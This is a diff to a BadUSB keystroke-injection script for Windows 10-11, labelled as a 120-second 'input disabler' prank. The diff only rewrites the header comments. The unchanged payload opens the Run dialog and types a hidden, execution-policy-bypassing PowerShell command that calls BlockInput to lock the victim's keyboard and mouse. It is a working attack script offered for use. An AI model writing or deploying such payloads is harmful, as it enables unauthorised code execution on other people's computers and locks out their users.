@@ -2,8 +2,14 @@
 # If BadUSB does not work for you - Transfer the device to DeepSleep
 # and then try to enable and run the script again.
 
-REM FORKED INPUT DISABLER FOR 120 SEC | BY RXSEESH
-REM @guns.lol/RXSEESH | @github.com/RXSEESH
+REM ############################################
+REM # Title    : INPUT DISABLER 120S (MOUSE)   |
+REM # Author   : RXSEESH                       |
+REM # Version  : FIXED                         |
+REM # Category : PRANKS                        |
+REM # Target   : WINDOWS 10-11                 |
+REM ############################################
+REM   @guns.lol/RXSEESH | @github.com/RXSEESH
 GUI r
 DELAY 750
 STRING powershell -W H -Ep Bypass -C $s='[DllImport(\"user32.dll\")][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);';Add-Type -M $s -Name U -Names W;[W.U]::BlockInput($true);sleep 120;[W.U]::BlockInput($false)
